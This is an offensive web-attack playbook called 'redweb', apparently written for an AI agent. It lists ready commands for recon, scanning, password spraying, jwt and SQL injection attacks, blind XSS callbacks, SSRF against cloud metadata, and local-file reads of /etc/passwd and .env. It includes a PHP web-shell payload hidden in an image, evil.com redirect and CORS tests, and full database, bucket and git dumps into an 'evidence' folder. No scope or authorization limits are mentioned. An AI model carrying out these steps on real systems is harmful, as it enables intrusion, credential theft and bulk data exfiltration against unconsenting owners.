# tool list — redweb

one list, organized by job. usage examples are the real shape; when unsure of a flag, check `-h` at runtime.

## recon

- `whois <domain>` — registrant, nameservers, expiry
- `dig any <domain>`; per-type `dig +short A|AAAA|MX|NS|TXT|SOA|CNAME <name>`; zone transfer attempt `dig axfr @<ns> <domain>`
- subdomain enum: `subfinder -d <domain> -silent` / `amass enum -d <domain>` / `assetfinder <domain>` / `dnsrecon -d <domain>` / `dnsenum <domain>`
- people/emails: `theharvester -d <domain> -b all`
- cert SANs: `cero <domain>`
- shodan (needs `SHODAN_API_KEY`; if unset ask the user to run `shodan init <key>`): `shodan host <ip>`, `shodan domain <domain>`, `shodan search 'org:<something>'`
- censys if key present
- crt.sh fallback: `curl -s 'https://crt.sh/?q=%.domain.com&output=json' | jq -r '.[].name_value' | sort -u`

## host + network

- quick: `nmap -T4 --top-ports 200 -sV <target> -oN raw/nmap-quick.txt`
- full: `nmap -p- -sV -sC -Pn <target> -oN raw/nmap-full.txt` (say it may run 30+ min before launching)
- rustscan for throughput: `rustscan -a <ip> --ulimit 5000 -- -sC -sV`
- udp: `nmap -sU --top-ports 50 <ip>`
- masscan when speed matters: `masscan -p1-65535 <ip> --rate 10000`
- smb/ldap on windows hits: `nmap -p 445 --script smb-vuln-* <ip>`; `netexec smb <ip> -u '' -p '' --shares --users` → creds found later get plugged in (`netexec ldap <dc> -u <user> -p <pass> --bloodhound --bloodhound-collection All`)
- snmp: `snmpwalk -v 2c -c public <ip>`

## web fingerprinting

- `httpx -l subs.txt -status-code -title -tech-detect -cname -cdn` — live-ness + server/framework/CDN
- `whatweb -a 3 -v <targets>`
- `wafw00f <url>` — know the WAF before you fuzz
- crude: `curl -IL <url>` and read headers yourself
- `nuclei -l subs.txt -t technologies/`

## fuzzing and dir/param discovery

- **bunbuster** (user-directed primary): `git clone https://github.com/tiagozip/bunbuster`; read its README for exact flags and install at runtime rather than assuming
- `ffuf -u 'https://<host>/FUZZ' -w <wordlist> -mc all -fc 404 -ac -t 20 -o raw/ffuf-dirs.json`
- extensions: `-w extensions.txt -x php,html,asp,aspx,bak`
- vhost fuzzing: `ffuf -u 'https://<default-host>/' -H 'Host: FUZZ.<domain>' -w subs.txt -fc 302 -ac`
- params: `arjun -u <url>`; custom per-endpoint: `ffuf -u 'https://<host>/path?param=FUZZ' -w params.txt` (same `FUZZ` marker in headers or body when the param lives there)
- wordlists: SecLists (`https://github.com/danielmiessler/SecLists`), on-package `/usr/share/wordlists/`

## subdomain takeover

- `nuclei -l subs.txt -t takeovers/`
- `subjack -w subs.txt -ssl -v 2>/dev/null`
- ambiguous ones: check fingerprints against `can-i-take-over-xyz`

## endpoint/content harvesting

- `gau <domain>`, `waybackurls <domain>`, `katana -u <url> -d 3 -jc`, `hakrawler -url <url> -depth 3`
- JS mining: fetch all `.js`, grep for `fetch(`, `axios`, `api.`, `token`, `apikey`, `secret`, `.m3u8`, `http://`
- api docs: probe `/openapi.json`, `/swagger.json`, `/api-docs`, `/graphql` (introspection payload `{__schema{types{name}}}`)

## vuln scanning / CVE pairing

- wide scan: `nuclei -l subs.txt -severity critical,high -t cves/ -t exposures/`
- `nikto -h <host> -o raw/nikto.txt`
- versions → cve: feed exact versions (PHP, nginx, apache, wordpress, mysql, node, django, electron) found in fingerprinting into
  - `searchsploit <product> <version>` (`-x <id>` or `-p <id> --mirror` to grab)
  - NVD: `curl 'https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=<product>' | jq`
  - OSV: `curl -s -X POST https://api.osv.dev/v1/query -d '{"package":{"name":"<pkg>","ecosystem":"<eco>"},"version":"<ver>"}'`
  - harness `cve-mcp` tools if present: `mcp__cve-mcp__search_cves`, `mcp__cve-mcp__triage_cve`, `mcp__cve-mcp__shodan_host_lookup`
  - check known-exploited status (CISA KEV) for anything found — a KEV-listed CVE on a fingerprinted version is the report lead
- wordpress: `wpscan --url <url> --enumerate ap,at,au --api-token <if supplied>`
- node/python/etc package versions in leaked lockfiles: run the versions through OSV like source-guard

## auth attacks

- default-cred spray first pass (pick few obvious pairs by hand: `admin:admin`, `admin:password`...), then tooling:
- `hydra -L <users> -P <pass> <host> <proto>` — ssh/ftp/mysql/psql/rdp
- http form: `hydra -L <users> -P <pass> <host> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`
- `medusa -U <users> -P <pass> -h <host> -M <service>`
- jwt: `jwt_tool <token> -C -d <dict>`; `-X a` alg confusion, `-X b` key readback, `-X c` kid inject
- oauth: manual curl walk — `state` present, `redirect_uri`/`redirect_uri.schema` sloppy, code reuse, PKCE missing. replay each variant, don't read and hope.

## one-shot attack tools

- sqli: `sqlmap -u '<url?param=1>' --batch --random-agent --level=3 --risk=2 --dbms=<best-guess>` (open with level 3; escalate only if it stalls); `--forms` plus `--crawl` on login-heavy apps
- xss: `dalfox url '<url-with-param>' --blind <cb-host>`
- ssrf: test `http://169.254.169.254/latest/meta-data/`, gopher, redirect-following via `<fetch>` params; if the response embeds, ffuf the `Host:` variety (`-d` file) for internal-findings
- smuggler: `smuggler -u <url>` for CL.TE/TE.CL
- deserialization: `ysoserial` (java), `phpggc` (php), `ysoserial.net` (.net); find gadget chains per framework version
- lfi: `ffuf -w traversal-lists` at `file=`, `/etc/passwd` first, then app-specific config (`/etc/nginx/sites-enabled`, `.env`, `wp-config.php`)
- upload bypass matrix: content-type mismatch, double ext (`jpg.php`), magic bytes (`exiftool -Comment='<?php system($_GET[0]); ?>' x.jpg`), null byte on old php
- ssti: inject template markers `{{7*7}}` (jinja), `${7*7}` (el), `<%= 7*7 %>` (erb), `#{7*7}` (ruby), `{7*7}` (smarty), `[[7*7]]` (twig); confirmed `49` = engine reach
- cors: `curl -s -H 'Origin: https://evil.com' <url> -I` and check `Access-Control-Allow-Origin` echo
- open redirect: `curl -sI '<url>?next=//evil.com'`, `?redirect=https://evil.com`
- graphql: introspection, depth-cost abuse, auth-z on queries by role, `dump` via `__type`

## cloud and buckets

- `s3scanner scan --provider s3 --bucket-file buckets.txt` (s3/gcs/azure/digitalocean)
- listing allowed: `curl -s 'https://<bucket>.s3.amazonaws.com/?list-type=2'` → dump XML to raw/
- bucket name gen from brand + envstrings + subdomain pieces
- keys in code: after any source leak, `gitleaks detect -s <dir>`, `trufflehog github --repo <url>` / `trufflehog filesystem <dir>`

## databases (on any hit → extract to evidence/)

- `sqlmap ... --dump` for full rows; for large tables use `--start N --stop M` chunks
- creds from elsewhere matter too: `mysql -h <host> -u<user> -p<pass> -e 'show databases; use <db>; select * from <table>;' > evidence/<domain>/dbs/mysql-<db>.txt`
- postgres: `psql -h <host> -U <user> -W -c '\dt' > evidence/<domain>/dbs/pg-tables.txt`
- mongo: `mongodump --uri 'mongodb://<host>' --out evidence/<domain>/dbs/mongo/`
- elastic: `curl -s '<host>:9200/_cat/indices?v'` then per-index `/_search?size=10000` → `.json` files
- redis: `redis-cli -h <host> --scan | head -200`, then `redis-cli -h <host> GET <key>` per interesting key, or full `redis-cli -h <host> --rdb evidence/<domain>/dbs/redis.rdb`
- every dump saved under `evidence/<domain>/dbs/` and named for what it is

## deep content intrusions

- leaked repo: `git-dumper http://<host>/.git/ evidence/<domain>/git/` (also `.svn`, `.hg`, `.DS_Store`)
- admin paths: `/admin`, `/administrator`, `/wp-admin`, `/user/login`, `/manage`, `/console`
- panels and infra: tomcat `/manager/html`, jenkins, `kibana`, `grafana :3000`, `minio :9000`, spark, `whoami`, `phpinfo`, `.well-known/`

## payload sources (read these, don't hand-roll)

- https://github.com/swisskyrepo/PayloadsAllTheThings — clone to `/tmp/pat` once, `find` per class
- https://book.hacktricks.xyz
- exploit-db via searchsploit (offline mirror preferred)
